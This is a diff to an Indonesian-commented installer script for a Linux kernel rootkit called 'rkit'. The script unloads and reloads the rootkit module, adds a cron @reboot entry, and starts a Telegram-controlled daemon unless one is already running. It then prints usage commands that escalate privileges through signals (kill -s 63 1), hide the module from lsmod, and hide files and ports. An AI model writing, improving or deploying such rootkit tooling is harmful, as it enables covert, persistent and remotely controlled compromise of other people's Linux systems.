@@ -102,9 +102,9 @@ else
 fi
 
 # ----------------6. unload lama (hindari "File exists") ----------------
-# kill -s62 dulu: bila modul tersembunyi (tak terlihat di /proc/modules),
+# kill -s 62 dulu: bila modul tersembunyi (tak terlihat di /proc/modules),
 # sinyal menampilkannya kembali agar rmmod bisa menemukannya.
-kill -s62 1 2>/dev/null || true
+kill -s 62 1 2>/dev/null || true
 for m in rkit4x rkit rkit6x; do
 	if grep -q "^$m " /proc/modules 2>/dev/null; then
 		if rmmod "$m" 2>/tmp/rkit-rmmod.log; then
@@ -178,7 +178,7 @@ if [ ! -f "$CFG" ]; then
 	echo "[i] mode CLI — daemon tidak dijalankan (ingin telegram? cp config.example.ini config.ini)"
 elif ! grep -q "^CONTROL_MODE=telegram" "$CFG"; then
 	echo "[i] CONTROL_MODE != telegram — daemon tidak dijalankan"
-elif grep -q "LETAKKAN TOKEN" "$CFG"; then
+elif [ -z "$(sed -n 's/^TELEGRAM_TOKEN=//p' "$CFG" | head -n 1)" ] || grep -qE '^TELEGRAM_TOKEN=LETAKKAN' "$CFG"; then
 	echo "[!] token masih placeholder — isi config.ini lalu jalankan manual:"
 	echo "    python3 $ROOT/control/telegram/daemon.py"
 elif [ -z "$PYTHON" ]; then
@@ -189,18 +189,23 @@ else
 		{ crontab -l 2>/dev/null; echo "$RB"; } | crontab - 2>/dev/null \
 			&& echo "[+] cron @reboot ditambahkan"
 	fi
-	nohup "$PYTHON" "$ROOT/control/telegram/daemon.py" >> "$ROOT/agent.log" 2>&1 &
-	echo "[+] daemon telegram start — cek pesan 'online' di bot kamu"
-	echo "    log: $ROOT/agent.log"
+	# anti-DOUBLE: kalau daemon sudah hidup, jangan jalankan lagi
+	if pgrep -f "control/telegram/daemon.py" >/dev/null 2>&1; then
+		echo "[i] daemon telegram SUDAH berjalan — tidak distart ulang"
+	else
+		nohup "$PYTHON" "$ROOT/control/telegram/daemon.py" >> "$ROOT/agent.log" 2>&1 &
+		echo "[+] daemon telegram start — cek pesan 'online' di bot kamu"
+		echo "    log: $ROOT/agent.log"
+	fi
 fi
 
 echo "== SELESAI =="
 echo "Uji sekarang (docs/TESTING.md), lalu laporkan error/kurangnya."
 if [ "$BACKEND_KIND" = "legacy" ]; then
 	echo "Perintah cepat (legacy — kontrol via SINYAL + param insmod):"
-	echo "  kill -s63 1                                  # LPE (uji dari user biasa)"
-	echo "  kill -s64 1                                  # hide modul -> lsmod kosong"
-	echo "  kill -s62 1                                  # tampilkan modul (sebelum rmmod)"
+	echo "  kill -s 63 1                                  # LPE (uji dari user biasa)"
+	echo "  kill -s 64 1                                  # hide modul -> lsmod kosong"
+	echo "  kill -s 62 1                                  # tampilkan modul (sebelum rmmod)"
 	echo "  rmmod rkit4x && insmod $KO hide=\"rahasia.txt\" hideport=\"8080\""
 	echo "                                               # ^ reload untuk menerapkan daftar hide"
 	echo "  rmmod rkit4x                                 # unload bersih (tabel dipulihkan)"
@@ -212,6 +217,6 @@ else
 	echo "  $ROOT/control/cli/rkit hide port <port>"
 	echo "  $ROOT/control/cli/rkit hide mod        # sembunyikan dari lsmod"
 	echo "  $ROOT/control/cli/rkit unhide mod      # WAJIB sebelum rmmod"
-	echo "  kill -s63 1                            # tes LPE"
+	echo "  kill -s 63 1                            # tes LPE"
 	echo "  rmmod rkit 2>/dev/null || rmmod rkit6x"
 fi
